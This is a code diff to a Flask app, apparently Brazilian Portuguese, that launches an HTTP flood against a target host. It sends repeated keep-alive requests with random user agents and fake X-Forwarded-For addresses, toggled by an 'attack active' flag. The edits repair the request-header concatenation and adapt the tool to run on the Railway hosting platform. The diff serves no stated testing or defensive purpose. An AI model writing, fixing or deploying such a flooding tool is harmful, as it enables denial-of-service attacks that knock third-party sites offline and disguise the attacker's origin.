@@ -1,9 +1,9 @@
-
 from flask import Flask, request
 import threading
 import socket
 import random
 import time
+import os
 
 app = Flask(__name__)
 
@@ -34,7 +34,12 @@ def simular_conexao(host):
             fake_ip = gerar_ip_falso()
             user_agent = random.choice(user_agents)
 
-            headers = f"GET / HTTP/1.1\r\n"                       f"Host: {host}\r\n"                       f"User-Agent: {user_agent}\r\n"                       f"X-Forwarded-For: {fake_ip}\r\n"                       f"Accept: */*\r\n"                       f"Connection: keep-alive\r\n\r\n"
+            headers = f"GET / HTTP/1.1\r\n" \
+                      f"Host: {host}\r\n" \
+                      f"User-Agent: {user_agent}\r\n" \
+                      f"X-Forwarded-For: {fake_ip}\r\n" \
+                      f"Accept: */*\r\n" \
+                      f"Connection: keep-alive\r\n\r\n"
 
             for _ in range(50):
                 if not ataque_ativo:
@@ -109,5 +114,7 @@ def stop():
     </html>
     '''
 
+# ✅ ESSA PARTE É A CORREÇÃO IMPORTANTE PARA RODAR NO RAILWAY:
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
